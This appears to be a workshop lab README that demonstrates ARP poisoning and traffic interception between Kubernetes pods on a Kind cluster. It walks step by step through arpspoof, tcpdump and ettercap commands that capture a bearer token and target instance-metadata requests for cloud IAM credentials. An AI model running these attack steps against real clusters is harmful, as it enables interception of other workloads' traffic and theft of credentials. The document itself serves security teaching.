# ARP Poisoning and IP Spoofing

When Kubernetes uses a bridge-based CNI (such as kubenet or flannel in host-gw mode), pods on the same node share a Layer 2 network segment. An attacker with access to a privileged pod can broadcast gratuitous ARP replies to poison the ARP caches of neighboring pods, redirecting their traffic through the attacker's pod.

## Description

Kubernetes has numerous network plugins (Container Network Interfaces or CNIs) that can be used in the cluster. Kubenet is the basic, and in many cases the default, network plugin. In this configuration, a bridge is created on each node (`cbr0`) to which the various pods are connected using veth pairs. Because cross-pod traffic on the same node traverses a Layer 2 bridge component, ARP poisoning is possible.

If an attacker gets access to a pod in the cluster with the `NET_ADMIN` and `NET_RAW` capabilities — or if the pod runs as privileged — they can perform ARP poisoning and spoof the traffic of other pods on the same node. This technique enables:

- **Man-in-the-Middle (MitM)** — intercept and inspect unencrypted traffic between pods.
- **Credential harvesting** — capture credentials sent over HTTP, plain-text database protocols, or internal APIs.
- **DNS spoofing** — intercept DNS queries to redirect traffic to attacker-controlled hosts.
- **Cloud identity theft** — intercept requests to the instance metadata service (`169.254.169.254`) to steal IAM credentials intended for other pods (`CVE-2021-1677`).

## Prerequisites

- A running Kind cluster (`workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- The attacker pod requires `privileged: true` (with `NET_ADMIN` and `NET_RAW` capabilities). In Kind clusters, `NET_ADMIN`+`NET_RAW` alone is insufficient to write `/proc/sys/net/ipv4/ip_forward` due to sysctl namespace restrictions — `privileged: true` is required.

> **Note:** Kind clusters run nodes as Docker containers. The bridge-based network topology inside a Kind node means ARP-level attacks between pods on the same node are demonstrable **when using a bridge-based CNI such as kindnet (the default) or flannel in host-gw mode**. If the cluster uses **Calico** (which routes inter-pod traffic through the node's virtual gateway rather than a shared L2 bridge), pods on the same node will not have direct ARP entries for each other — all traffic resolves to the gateway MAC only, and `arpspoof -t <pod-ip>` will fail with "couldn't arp for host". In production clusters with encrypted overlay networks (e.g., Cilium with WireGuard, Calico with WireGuard), ARP poisoning has no effect on encrypted traffic.
>
> To run this demo, ensure your Kind cluster uses the default **kindnet** CNI rather than Calico.

## Quick Start

### Step 1 — Deploy the scenario

Deploy a victim pod (simulating a legitimate workload sending sensitive data), a target server, and an attacker pod with the necessary Linux capabilities:

```bash
kubectl apply -f scenario.yaml
```

Wait for all pods to become ready:

```bash
kubectl wait --for=condition=Ready pod -l role=victim -n arp-demo --timeout=60s
kubectl wait --for=condition=Ready pod -l role=target -n arp-demo --timeout=60s
kubectl wait --for=condition=Ready pod -l role=attacker -n arp-demo --timeout=60s
```

Verify the deployments:

```bash
kubectl get pods -n arp-demo -o wide
```

Note the `NODE` column — for ARP poisoning to work, the attacker and victim should be on the same node. Kind clusters typically have a single worker node, so this is automatically satisfied.

Example output:

```
NAME             READY   STATUS    NODE
attacker-...     1/1     Running   workshop-cluster-worker
target-...       1/1     Running   workshop-cluster-worker
victim-...       1/1     Running   workshop-cluster-worker
```

### Step 2 — Identify pod IP addresses

Record the IP addresses of the target and victim pods:

```bash
TARGET_IP=$(kubectl get pod -n arp-demo -l role=target \
    -o jsonpath='{.items[0].status.podIP}')
VICTIM_IP=$(kubectl get pod -n arp-demo -l role=victim \
    -o jsonpath='{.items[0].status.podIP}')
GATEWAY_IP=$(kubectl get pod -n arp-demo -l role=target \
    -o jsonpath='{.items[0].status.hostIP}')

echo "Target pod IP:  ${TARGET_IP}"
echo "Victim pod IP:  ${VICTIM_IP}"
echo "Node/gateway IP: ${GATEWAY_IP}"
```

### Step 3 — Observe legitimate traffic (baseline)

Exec into the victim pod and confirm it can reach the target directly:

```bash
VICTIM_POD=$(kubectl get pod -n arp-demo -l role=victim \
    -o jsonpath='{.items[0].metadata.name}')

kubectl exec -it -n arp-demo ${VICTIM_POD} -- sh
```

Inside the victim pod:

```bash
# Confirm direct access to the target
curl -s http://${TARGET_IP}/
# Expected: "Hello from the target server"
exit
```

### Step 4 — Verify the attacker pod capabilities

Exec into the attacker pod and confirm the required capabilities are present:

```bash
ATTACKER_POD=$(kubectl get pod -n arp-demo -l role=attacker \
    -o jsonpath='{.items[0].metadata.name}')

kubectl exec -it -n arp-demo ${ATTACKER_POD} -- sh
```

Inside the attacker pod:

```bash
# Verify network capabilities are available
cat /proc/self/status | grep CapEff

# List network interfaces — eth0 is the pod's veth pair endpoint
ip addr show eth0

# View the ARP table (initially populated with other pods on the bridge)
arp -n

# Confirm arpspoof is available
which arpspoof
exit
```

### Step 5 — Enable IP forwarding on the attacker pod

For a transparent MitM, the attacker must forward packets it intercepts so the victim doesn't notice an outage:

```bash
kubectl exec -it -n arp-demo ${ATTACKER_POD} -- sh
```

```bash
# Enable IP forwarding so intercepted packets are forwarded to their real destination
echo 1 > /proc/sys/net/ipv4/ip_forward

# Verify
cat /proc/sys/net/ipv4/ip_forward
# Expected: 1
```

### Step 6 — Perform ARP poisoning with arpspoof

`arpspoof` (from the `dsniff` package) sends gratuitous ARP replies to poison ARP caches. To perform a full bidirectional MitM you need to run two `arpspoof` processes simultaneously.

Still inside the attacker pod, run ARP poisoning in the background:

```bash
# Tell the VICTIM that the ATTACKER is the TARGET (attacker's MAC = target's IP)
arpspoof -i eth0 -t ${VICTIM_IP} ${TARGET_IP} &

# Tell the TARGET that the ATTACKER is the VICTIM (attacker's MAC = victim's IP)
arpspoof -i eth0 -t ${TARGET_IP} ${VICTIM_IP} &

# Wait a few seconds for ARP caches to be poisoned
sleep 5

# Confirm the victim's ARP table now shows the attacker's MAC for the target IP
# (Run this from a separate terminal: kubectl exec into the victim pod and run: arp -n)
echo "ARP poisoning in progress..."
```

### Step 7 — Intercept traffic with tcpdump

While ARP poisoning is running, use `tcpdump` to capture HTTP traffic flowing through the attacker pod:

```bash
# Capture HTTP traffic on the attacker's eth0 interface
tcpdump -i eth0 -A -s 0 'port 80' 2>/dev/null
```

In a **separate terminal**, exec into the victim pod and make a request:

```bash
VICTIM_POD=$(kubectl get pod -n arp-demo -l role=victim \
    -o jsonpath='{.items[0].metadata.name}')
TARGET_IP=$(kubectl get pod -n arp-demo -l role=target \
    -o jsonpath='{.items[0].status.podIP}')

kubectl exec -n arp-demo ${VICTIM_POD} -- \
    sh -c "curl -s -H 'Authorization: Bearer secret-token-12345' http://${TARGET_IP}/"
```

Back in the attacker's `tcpdump` output, you will see the intercepted HTTP request including the `Authorization` header:

```
GET / HTTP/1.1
Host: 10.244.0.x
Authorization: Bearer secret-token-12345
User-Agent: curl/8.5.0
```

The attacker has captured credentials from traffic that was never intended for their pod.

Stop the arpspoof processes and exit:

```bash
kill %1 %2 2>/dev/null
exit
```

### Step 8 — Demonstrate with ettercap (alternative tool)

`ettercap` provides a more automated ARP poisoning and sniffing workflow:

```bash
kubectl exec -it -n arp-demo ${ATTACKER_POD} -- sh
```

```bash
# Run ettercap in text mode: ARP poisoning between victim and target
# -T = text mode, -q = quiet, -M arp = MitM via ARP, /VICTIM// /TARGET//
ettercap -T -q -i eth0 -M arp /${VICTIM_IP}// /${TARGET_IP}//
```

### Step 9 — Observe CVE-2021-1677 style attack vector

On cloud-managed nodes, each pod may make requests to the instance metadata service at `169.254.169.254`. An attacker on the same node can intercept those requests to steal the node's cloud IAM credentials:

```bash
kubectl exec -it -n arp-demo ${ATTACKER_POD} -- sh
```

```bash
# Get the gateway (default route) — this is the node's bridge IP
GATEWAY=$(ip route | awk '/default/ {print $3}')
echo "Gateway: ${GATEWAY}"

# Poison ARP: tell all pods that the attacker is the gateway
# This intercepts traffic to 169.254.169.254 which routes through the gateway
arpspoof -i eth0 ${GATEWAY} &

# Capture any IMDS traffic
tcpdump -i eth0 -A 'host 169.254.169.254' 2>/dev/null
exit
```

## Cleanup

```bash
kubectl delete -f scenario.yaml
```

## Resources

- [CVE-2021-1677](https://nvd.nist.gov/vuln/detail/CVE-2021-1677)
- [arpspoof (dsniff)](https://linux.die.net/man/8/arpspoof)
- [ettercap](https://www.ettercap-project.org/)
- [MITRE ATT&CK - ARP Cache Poisoning](https://attack.mitre.org/techniques/T1557/002/)
- [Kubernetes CNI Plugins](https://kubernetes.io/docs/concepts/extend-kubernetes/compute-storage-net/network-plugins/)
- [Calico WireGuard Encryption](https://docs.tigera.io/calico/latest/compliance/encrypt-cluster-pod-traffic)
- [Cilium Transparent Encryption](https://docs.cilium.io/en/stable/security/network/encryption-wireguard/)
